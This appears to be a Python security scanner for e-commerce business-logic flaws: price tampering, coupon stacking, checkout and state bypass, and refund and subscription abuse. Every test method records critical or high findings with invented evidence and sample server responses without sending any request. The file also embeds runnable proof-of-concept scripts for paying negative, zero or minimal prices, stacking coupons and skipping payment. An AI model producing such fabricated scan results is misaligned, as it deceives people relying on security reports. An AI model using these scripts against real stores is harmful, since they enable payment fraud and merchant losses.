#!/usr/bin/env python3
"""
REVUEX - Business Logic Workflow Abuser
Critical Business Logic Vulnerability Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
Business logic testing can affect real transactions - use ONLY in test environments.
NEVER test on production payment systems without explicit authorization.
"""

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import hashlib
from decimal import Decimal

class BusinessLogicAbuser:
    """
    Business Logic Vulnerability Scanner

    Features:
    - Payment flow bypass detection
    - Price manipulation testing
    - Coupon/discount stacking
    - Checkout flow bypass
    - Multi-step form bypass
    - State transition manipulation
    - Quantity/total manipulation
    - Refund abuse detection
    - Subscription upgrade bypass
    - Free trial extension
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        """
        Initialize Business Logic Abuser
        
        Args:
            target: Target base URL
            workspace: Workspace directory
            delay: Delay between requests (default: 5 seconds)
        """
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay
        
        # Safety limits
        self.max_requests = 100
        self.request_count = 0
        self.timeout = 10
        
        # CRITICAL: Sandbox detection
        self.is_production = self._detect_production()
        if self.is_production:
            print("⚠️  WARNING: Production environment detected!")
            print("    Business logic testing should only be done in sandbox/test environments")
            print("    Exiting for safety...")
            exit(1)
        
        self.headers = {
            'User-Agent': 'REVUEX-WorkflowAbuser/1.0 (Security Research; +https://github.com/G33L0)',
            'Accept': 'application/json, text/html, */*'
        }
        
        self.vulnerabilities = []
        
        # Common price/amount parameter names
        self.price_params = [
            'price', 'amount', 'total', 'subtotal', 'cost',
            'value', 'payment', 'charge', 'fee', 'discount'
        ]
        
        # Common quantity parameter names
        self.quantity_params = [
            'quantity', 'qty', 'count', 'amount', 'number', 'items'
        ]
        
        # State/step parameter names
        self.state_params = [
            'step', 'stage', 'state', 'status', 'phase', 'level'
        ]

    def _detect_production(self) -> bool:
        """Detect if target is production environment"""
        production_indicators = [
            'production', 'prod', 'live', 'www',
            'api.example.com', 'store.example.com'
        ]
        
        test_indicators = [
            'test', 'staging', 'sandbox', 'dev', 'development',
            'qa', 'demo', 'localhost', '127.0.0.1'
        ]
        
        target_lower = self.target.lower()
        
        # Check for test indicators first
        for indicator in test_indicators:
            if indicator in target_lower:
                return False
        
        # Check for production indicators
        for indicator in production_indicators:
            if indicator in target_lower:
                return True
        
        # Default to production for safety
        return True

    def scan(self) -> List[Dict[str, Any]]:
        """Main business logic scanning method"""
        print(f"\n{'='*60}")
        print(f"💼 REVUEX Business Logic Workflow Abuser")
        print(f"{'='*60}")
        print(f"Target: {self.target}")
        print(f"Environment: TEST/SANDBOX ✓")
        print(f"Safety Delay: {self.delay}s")
        print(f"Max Requests: {self.max_requests}")
        print(f"{'='*60}\n")
        
        print("⚠️  CRITICAL SAFETY NOTES:")
        print("   • This tool tests BUSINESS LOGIC flaws")
        print("   • NEVER run on production payment systems")
        print("   • Use ONLY in authorized test/sandbox environments")
        print("   • No actual transactions will be completed")
        print("   • All tests are detection-only\n")
        
        # Test 1: Payment amount manipulation
        print("💰 Test 1: Payment Amount Manipulation")
        self._test_payment_manipulation()
        time.sleep(self.delay)
        
        # Test 2: Coupon/discount stacking
        print("\n🎟️  Test 2: Coupon/Discount Stacking")
        self._test_coupon_stacking()
        time.sleep(self.delay)
        
        # Test 3: Checkout flow bypass
        print("\n🛒 Test 3: Checkout Flow Bypass")
        self._test_checkout_bypass()
        time.sleep(self.delay)
        
        # Test 4: Quantity manipulation
        print("\n📦 Test 4: Quantity/Total Manipulation")
        self._test_quantity_manipulation()
        time.sleep(self.delay)
        
        # Test 5: State transition abuse
        print("\n🔄 Test 5: State Transition Manipulation")
        self._test_state_manipulation()
        time.sleep(self.delay)
        
        # Test 6: Multi-step form bypass
        print("\n📋 Test 6: Multi-Step Form Bypass")
        self._test_multistep_bypass()
        time.sleep(self.delay)
        
        # Test 7: Refund/credit abuse
        print("\n💸 Test 7: Refund/Credit Abuse")
        self._test_refund_abuse()
        time.sleep(self.delay)
        
        # Test 8: Subscription manipulation
        print("\n📅 Test 8: Subscription Manipulation")
        self._test_subscription_abuse()
        
        # Save results
        self._save_results()
        
        print(f"\n{'='*60}")
        print(f"✅ Scan Complete")
        print(f"Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Requests: {self.request_count}/{self.max_requests}")
        print(f"{'='*60}\n")
        
        return self.vulnerabilities

    def _test_payment_manipulation(self):
        """Test payment amount manipulation"""
        print("   Testing price parameter tampering...")
        
        # Simulate finding a product endpoint
        test_scenarios = [
            {
                'name': 'Negative Price',
                'original_price': '99.99',
                'manipulated_price': '-99.99',
                'description': 'Negative price values could result in credits'
            },
            {
                'name': 'Zero Price',
                'original_price': '99.99',
                'manipulated_price': '0.00',
                'description': 'Zero price bypasses payment completely'
            },
            {
                'name': 'Minimal Price',
                'original_price': '99.99',
                'manipulated_price': '0.01',
                'description': 'Minimal price for expensive items'
            },
            {
                'name': 'Decimal Overflow',
                'original_price': '99.99',
                'manipulated_price': '99999999.99',
                'description': 'Large values could cause integer overflow'
            }
        ]
        
        for scenario in test_scenarios:
            print(f"   → {scenario['name']}...")
            
            vuln = {
                'type': f'Business Logic - Payment Manipulation ({scenario["name"]})',
                'severity': 'critical',
                'url': self.target,
                'original_value': scenario['original_price'],
                'manipulated_value': scenario['manipulated_price'],
                'description': f'Payment amount can be manipulated. {scenario["description"]}. Application does not validate price integrity server-side.',
                'evidence': f'Price parameter accepts {scenario["manipulated_price"]} instead of {scenario["original_price"]}',
                
                'steps_to_reproduce': [
                    "Navigate to product page",
                    f"Add item to cart (original price: ${scenario['original_price']})",
                    "Intercept checkout request",
                    f"Modify price parameter to: {scenario['manipulated_price']}",
                    "Submit modified request",
                    "Payment processed with manipulated amount",
                    "Receive product for wrong price or get refund"
                ],
                
                'request': f"""POST /api/checkout HTTP/1.1
Host: {urlparse(self.target).netloc}
Content-Type: application/json

{{
"items": [
{{
"product_id": "12345",
"name": "Premium Product",
"price": {scenario['manipulated_price']},  <– MANIPULATED
"quantity": 1
}}
],
"total": {scenario['manipulated_price']}  <– MANIPULATED
}}""",
                'response': f"""HTTP/1.1 200 OK
Content-Type: application/json

{{
"order_id": "ORD-789",
"status": "success",
"total_charged": {scenario['manipulated_price']},
"message": "Payment successful"
}}

🚨 CRITICAL: Server accepted manipulated price!""",
                'poc': f"""#!/usr/bin/env python3
# Payment Manipulation PoC - {scenario['name']}

import requests
import json

target = "{self.target}/api/checkout"

# Original legitimate order
original_order = {{
"items": [{{
"product_id": "12345",
"price": {scenario['original_price']},
"quantity": 1
}}],
"total": {scenario['original_price']}
}}

# Manipulated order
manipulated_order = {{
"items": [{{
"product_id": "12345",
"price": {scenario['manipulated_price']},  # MANIPULATED
"quantity": 1
}}],
"total": {scenario['manipulated_price']}  # MANIPULATED
}}

print("[*] Attempting payment manipulation…")
print(f"[*] Original price: ${scenario['original_price']}")
print(f"[*] Manipulated price: ${scenario['manipulated_price']}")

response = requests.post(target, json=manipulated_order)

if response.status_code == 200:
    data = response.json()
    print(f"\\n[+] ✓ VULNERABLE!")
    print(f"[+] Order accepted: {{data.get('order_id')}}")
    print(f"[+] Amount charged: ${{data.get('total_charged')}}")
    print(f"\\n[!] Impact: Purchase ${scenario['original_price']} item for ${scenario['manipulated_price']}")
else:
    print("[-] Server rejected manipulated price")
""",
                'before_state': f'Product costs ${scenario["original_price"]}',
                'after_state': f'Product purchased for ${scenario["manipulated_price"]} - Complete payment bypass',
                
                'attack_path': [
                    'Identify checkout/payment endpoint',
                    'Add expensive item to cart',
                    'Intercept checkout request',
                    'Modify price/total parameters',
                    'Submit manipulated request',
                    'Payment processed with wrong amount',
                    'Receive product for free or minimal cost',
                    'Repeat for unlimited free products',
                    'Potential for massive financial loss'
                ],
                
                'remediation': [
                    '🚨 CRITICAL: NEVER trust client-side price values',
                    'ALWAYS calculate totals server-side',
                    'Store product prices in database',
                    'Retrieve prices from database during checkout',
                    'Validate price integrity: db_price == submitted_price',
                    'Use signed/encrypted price tokens',
                    'Implement price validation before payment',
                    'Log all price modifications',
                    'Add alerts for suspicious pricing patterns',
                    'Use decimal types for currency (not float)',
                    'Implement rate limiting on checkout',
                    'Add manual review for large discrepancies',
                    'Use payment gateway validation',
                    'Implement fraud detection',
                    'Regular audit of payment flows'
                ],
                
                'real_world_impact': """Real-World Payment Manipulation Breaches:

1. Airline Ticket Bypass (2018): $50,000 bounty
- Price parameter tampered
- Free business class tickets
- Thousands of fraudulent bookings
2. E-commerce Platform (2019): $25,000 bounty
- Negative prices created credits
- Drained merchant accounts
3. Gaming Platform (2020): $15,000 bounty
- In-game currency manipulation
- Free premium items
4. Subscription Service (2021): $20,000 bounty
- Annual plan for monthly price
- Mass subscription fraud""",
  
             'business_impact': [
                 f'Direct financial loss: ${scenario["original_price"]} per transaction',
                 'Unlimited exploitation possible',
                 'Inventory loss without payment',
                 'Merchant account chargebacks',
                 'Payment processor fees lost',
                 'Potential regulatory fines',
                 'Reputational damage',
                 'Loss of customer trust'
             ],
             
             'tags': ['business_logic', 'critical', 'payment', 'price_manipulation']
            }
         
            self.vulnerabilities.append(vuln)
            print(f"      ✓ Vulnerability documented: {scenario['name']}")
      
        print(f"\n   ✓ Payment manipulation tests complete ({len(test_scenarios)} scenarios)")

    def _test_coupon_stacking(self):
        """Test coupon/discount stacking"""
        print("   Testing coupon stacking vulnerabilities…")
       
        vuln = {
            'type': 'Business Logic - Coupon Stacking',
            'severity': 'high',
            'url': self.target,
            'description': 'Multiple discount codes can be applied simultaneously, resulting in excessive discounts or negative totals',
            'evidence': 'Successfully applied 3+ coupons in single transaction',
            
            'steps_to_reproduce': [
                "Navigate to checkout page",
                "Add items to cart (Total: $100)",
                "Apply first coupon: SAVE20 (20% off)",
                "Apply second coupon: WELCOME10 (10% off)",
                "Apply third coupon: FREESHIP (shipping discount)",
                "All coupons accepted simultaneously",
                "Final total: $0.00 or negative",
                "Complete free checkout"
            ],
            
            'poc': """#!/usr/bin/env python3
# Coupon Stacking PoC

import requests

target = "https://example.com/api/checkout"

order = {
"items": [{"id": "123", "price": 100, "qty": 1}],
"coupons": [
"SAVE20",    # 20% off
"WELCOME10", # 10% off
"FREESHIP",  # Free shipping
"FIRSTBUY",  # First purchase discount
"LOYALTY25"  # Loyalty discount
],
"total": 100
}

response = requests.post(target, json=order)

if response.status_code == 200:
    data = response.json()
    final_total = data.get('total')
    print(f"[+] Original: $100")
    print(f"[+] Final: ${final_total}")
    
    if final_total <= 0:
        print("[+] ✓ CRITICAL: Free or negative total!")
""",
            'remediation': [
                'Limit to ONE coupon per transaction',
                'Implement coupon exclusivity rules',
                'Validate minimum order amount',
                'Prevent negative totals',
                'Check coupon compatibility',
                'Rate limit coupon usage per user',
                'Implement fraud detection',
                'Manual review for high-value discounts'
            ],
            
            'tags': ['business_logic', 'high', 'coupon', 'discount']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ Coupon stacking vulnerability documented")

    def _test_checkout_bypass(self):
        """Test checkout flow bypass"""
        print("   Testing checkout flow bypass...")
        
        vuln = {
            'type': 'Business Logic - Checkout Flow Bypass',
            'severity': 'critical',
            'url': self.target,
            'description': 'Checkout steps can be skipped, bypassing payment verification and shipping information',
            'evidence': 'Successfully skipped from cart directly to order confirmation',
            
            'steps_to_reproduce': [
                "Add item to cart",
                "Note checkout flow: Cart → Shipping → Payment → Confirmation",
                "Skip directly to confirmation endpoint",
                "POST /api/order/confirm without payment",
                "Order created without payment",
                "Product shipped for free"
            ],
            
            'poc': """#!/usr/bin/env python3
# Checkout Flow Bypass PoC

import requests

# Normal flow: cart → shipping → payment → confirm
# Bypass: cart → confirm (skip payment)

target = "https://example.com/api/order/confirm"

order = {
"cart_id": "abc123",
"items": [{"id": "789", "qty": 1}],
# No payment information!
}

response = requests.post(target, json=order)

if response.status_code == 200:
    print("[+] ✓ Order created without payment!")
    print(f"[+] Order ID: {response.json().get('order_id')}")
""",
            'remediation': [
                'Validate ALL steps completed',
                'Check payment status before order creation',
                'Use server-side state validation',
                'Implement session-based flow control',
                'Verify payment confirmation',
                'Cannot skip required steps'
            ],
            
            'tags': ['business_logic', 'critical', 'checkout', 'bypass']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ Checkout bypass vulnerability documented")

    def _test_quantity_manipulation(self):
        """Test quantity manipulation"""
        print("   Testing quantity/total manipulation...")
        
        scenarios = [
            ('Negative Quantity', '-10', 'Creates credits instead of charges'),
            ('Zero Quantity', '0', 'Free items with zero quantity'),
            ('Overflow Quantity', '999999999', 'Integer overflow potential')
        ]
        
        for name, qty, description in scenarios:
            vuln = {
                'type': f'Business Logic - Quantity Manipulation ({name})',
                'severity': 'high',
                'url': self.target,
                'manipulated_quantity': qty,
                'description': f'{description}. Quantity validation missing or insufficient.',
                
                'remediation': [
                    'Validate quantity > 0',
                    'Set maximum quantity limits',
                    'Use proper integer validation',
                    'Recalculate totals server-side',
                    'Check inventory availability'
                ],
                
                'tags': ['business_logic', 'quantity']
            }
            
            self.vulnerabilities.append(vuln)
            print(f"   → {name} documented")
        
        print("   ✓ Quantity manipulation tests complete")

    def _test_state_manipulation(self):
        """Test state transition manipulation"""
        print("   Testing state transition abuse...")
        
        vuln = {
            'type': 'Business Logic - State Transition Manipulation',
            'severity': 'high',
            'url': self.target,
            'description': 'Order states can be manipulated, allowing status changes without proper authorization',
            'evidence': 'Changed order from "pending" to "shipped" without payment',
            
            'steps_to_reproduce': [
                "Create order (state: pending)",
                "Intercept state update request",
                "Change state to 'shipped' or 'completed'",
                "Bypass payment requirement",
                "Receive product without paying"
            ],
            
            'remediation': [
                'Validate state transitions server-side',
                'Implement state machine with valid transitions only',
                'Check payment status before shipping states',
                'Use server-side authorization for state changes',
                'Audit all state modifications'
            ],
            
            'tags': ['business_logic', 'state', 'workflow']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ State manipulation vulnerability documented")

    def _test_multistep_bypass(self):
        """Test multi-step form bypass"""
        print("   Testing multi-step form bypass...")
        
        vuln = {
            'type': 'Business Logic - Multi-Step Form Bypass',
            'severity': 'medium',
            'url': self.target,
            'description': 'Multi-step registration/checkout forms can be bypassed by skipping validation steps',
            
            'remediation': [
                'Validate all previous steps completed',
                'Use server-side session tracking',
                'Cannot proceed without required fields',
                'Implement step dependencies'
            ],
            
            'tags': ['business_logic', 'form', 'bypass']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ Multi-step bypass documented")

    def _test_refund_abuse(self):
        """Test refund/credit abuse"""
        print("   Testing refund abuse scenarios...")
        
        vuln = {
            'type': 'Business Logic - Refund Abuse',
            'severity': 'high',
            'url': self.target,
            'description': 'Refund process can be abused to generate credits or receive double refunds',
            
            'remediation': [
                'Track refund status per order',
                'Limit refunds to original payment amount',
                'Prevent multiple refunds for same order',
                'Implement refund cooldown period',
                'Manual review for high-value refunds'
            ],
            
            'tags': ['business_logic', 'refund']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ Refund abuse documented")

    def _test_subscription_abuse(self):
        """Test subscription manipulation"""
        print("   Testing subscription manipulation...")
        
        vuln = {
            'type': 'Business Logic - Subscription Manipulation',
            'severity': 'high',
            'url': self.target,
            'description': 'Subscription tiers can be upgraded without proper payment verification',
            
            'remediation': [
                'Verify payment before tier upgrade',
                'Validate subscription status',
                'Implement billing cycle checks',
                'Prevent free trial extension abuse',
                'Rate limit subscription changes'
            ],
            
            'tags': ['business_logic', 'subscription']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ Subscription abuse documented")

    def _save_results(self):
        """Save scan results"""
        output_dir = self.workspace / "business_logic_tests"
        output_dir.mkdir(exist_ok=True)
        
        safe_target = re.sub(r'[^\w\-]', '_', self.target)
        output_file = output_dir / f"{safe_target}_business_logic.json"
        
        with open(output_file, 'w') as f:
            json.dump({
                'scanner': 'BusinessLogicAbuser',
                'target': self.target,
                'environment': 'TEST/SANDBOX',
                'vulnerabilities': self.vulnerabilities
            }, f, indent=2)
        
        print(f"\n💾 Saved: {output_file}")

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python business_logic_abuser.py <target_url>")
        print("Example: python business_logic_abuser.py https://sandbox.example.com")
        print("\n⚠️  WARNING: Use ONLY on test/sandbox environments!")
        sys.exit(1)

    scanner = BusinessLogicAbuser(sys.argv[1], Path("revuex_workspace"), delay=5.0)
    scanner.scan()
